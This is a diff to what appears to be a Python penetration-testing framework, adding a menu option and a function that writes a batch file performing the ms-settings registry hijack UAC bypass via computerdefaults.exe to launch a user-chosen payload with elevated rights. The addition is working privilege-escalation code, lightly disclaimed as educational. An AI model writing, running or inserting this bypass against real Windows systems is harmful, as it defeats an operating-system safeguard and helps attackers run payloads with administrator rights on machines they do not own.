@@ -96,6 +96,23 @@ def install_dependencies():
     # subprocess.run(["sudo", "gvm-check-setup"])
     # print("[INFO] OpenVAS (GVM) installation completed.")
 
+# Function to perform a UAC bypass (example, use responsibly and ethically)
+def uac_bypass():
+    payload_path = input("[INPUT] Enter the path to the payload executable (e.g., C:\\path\\to\\payload.exe): ")
+
+    # Example of a simple UAC bypass technique using a registry modification (for educational purposes only)
+    uac_bypass_script = f'''
+    @echo off
+    reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "{payload_path}" /f
+    reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /f
+    start computerdefaults.exe
+    '''
+
+    with open("uac_bypass.bat", "w") as file:
+        file.write(uac_bypass_script)
+
+    print("[INFO] UAC bypass script created as uac_bypass.bat. Execute this script to attempt the UAC bypass.")
+
 # Check and clone more_mass.py if not found
 def check_more_mass():
     if not os.path.exists("more_mass.py"):
@@ -577,6 +594,7 @@ def main_menu():
         print("5. Privilege Escalation & Persistence")
         print("6. Simulation")
         print("7. Generate Report")
+        print("8. UAC Bypass")
         print("0. Exit")
 
         choice = input("[INPUT] Choose an option: ")
@@ -594,6 +612,8 @@ def main_menu():
             simulation_menu()
         elif choice == "7":
             generate_report(recon_results)
+        elif choice == "8":
+            uac_bypass()
         elif choice == "0":
             print("[INFO] Exiting framework. Goodbye!")
             break
@@ -606,5 +626,5 @@ recon_results = {}
 # Initialize and start framework
 if __name__ == "__main__":
     display_disclaimer()
-    initialize()
+    install_dependencies()
     main_menu()
